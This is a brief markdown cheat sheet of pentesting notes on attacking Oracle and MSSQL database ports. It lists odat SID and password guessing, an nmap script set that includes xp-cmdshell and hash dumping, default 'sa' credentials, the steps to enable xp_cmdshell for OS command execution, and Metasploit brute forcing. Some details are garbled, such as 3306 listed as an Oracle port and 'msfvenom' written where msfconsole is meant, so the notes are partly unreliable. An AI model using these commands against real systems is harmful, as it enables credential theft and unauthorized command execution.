
# Oracle DB 
- **can run on a variety or ports including: 3306, 1433, 1521**

## What is it?
- a port used to connect to a target's database
- authenticated users (and maybe unauthenticated users) could, for example, run queries

## Enumeration
- use odat
  - setup is terrible but directions will be included inside here
  - python3 odat.py sidguesser -s [ip] -p [port] 
  - python3 odat.py passwordguesser -s [ip] -p [port] -d [SID] 
- nmap
  - nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p [port] [ip]


## Port 1433 SQL
- gaining a connection
  - unless you brute force, you'll probably need to enumorate a username and password
  - sqsh -S [ip] -U [username] 
    - will prompt you for password after this
    - default username: sa
    - defualt passwords: [blank], Password123

    
  ### sqsh Shell commands
    - xp_cmdshell 'whoami';
    - go
    - might have to enable xp_cmdshell
      - EXEC sp_configure 'show advanced options', 1;
      - RECONFIGURE
      - EXEC sp_configure 'xp_cmdshell', 1;
      - RECONFIGURE
    - 
  
  ## Port 1521 SQL
  - use the odat tool to make this work
  - you want to find an sid and user creds
    - $> python3 odat.py sidguesser -s [ip] -p [port]
    - $> python3 odat.py passwordguesser -s [ip] -p [port]
- using msfconsole to brute
    - $> sudo msfvenom
    - $> use admin/oracle/oracle_login
    - $> set RHOST [ip]
    - $> set SID [sid enum'd]
    - $> run
  
  
  
  


